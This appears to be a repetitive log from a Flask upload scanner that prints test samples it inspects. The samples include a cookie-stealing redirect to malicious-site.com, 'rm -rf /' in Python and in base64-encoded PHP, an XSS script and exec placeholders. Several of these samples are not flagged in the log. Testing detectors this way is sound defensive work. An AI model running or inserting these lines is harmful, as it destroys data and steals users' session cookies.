2025-02-22 20:53:49,149 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/1.sql
2025-02-22 20:53:49,149 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:53:49,150 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,151 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,152 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:53:49,154 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,155 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,156 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:53:49,157 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:53:49,158 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:53:49,160 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:53:49,161 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,161 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py
2025-02-22 20:53:49,161 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,162 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,167 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,167 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:53:49,167 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,168 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,168 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php
2025-02-22 20:53:49,168 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,169 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,170 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,171 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:53:49,174 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,175 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,180 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,180 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:53:49,180 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,182 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:53:49,183 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:53:49,184 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:53:49,185 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:53:49,186 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,187 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py
2025-02-22 20:53:49,187 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,188 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,193 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,193 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:53:49,193 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,194 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,194 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php
2025-02-22 20:53:49,194 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,195 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,196 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,197 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:53:49,200 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,201 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,207 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,207 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:53:49,207 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,208 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:53:49,210 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:53:49,211 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:53:49,213 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:53:49,214 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,214 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py
2025-02-22 20:53:49,214 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,215 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,221 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,221 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:53:49,221 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,222 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,222 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php
2025-02-22 20:53:49,222 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,223 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,225 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,226 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:53:49,228 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,229 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,235 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,235 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:53:49,235 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,236 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,236 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py
2025-02-22 20:53:49,236 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,237 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,237 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php
2025-02-22 20:53:49,237 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,238 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,240 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,241 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,242 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:53:49,243 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,248 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,248 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:53:49,249 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,250 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:53:49,250 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 20:53:49,250 - Moved text_hidden_yaml.yaml to trash due to suspicious content.
2025-02-22 20:53:49,251 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,252 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,252 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py
2025-02-22 20:53:49,252 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,253 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,253 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php
2025-02-22 20:53:49,253 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,258 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,259 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,260 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,261 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:53:49,263 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,268 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,268 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:53:49,268 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,270 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:53:49,270 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 20:53:49,270 - Moved text_hidden_yaml.yaml to trash due to suspicious content.
2025-02-22 20:53:49,271 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,272 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,272 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py
2025-02-22 20:53:49,272 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,273 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,273 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php
2025-02-22 20:53:49,273 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,274 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,275 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

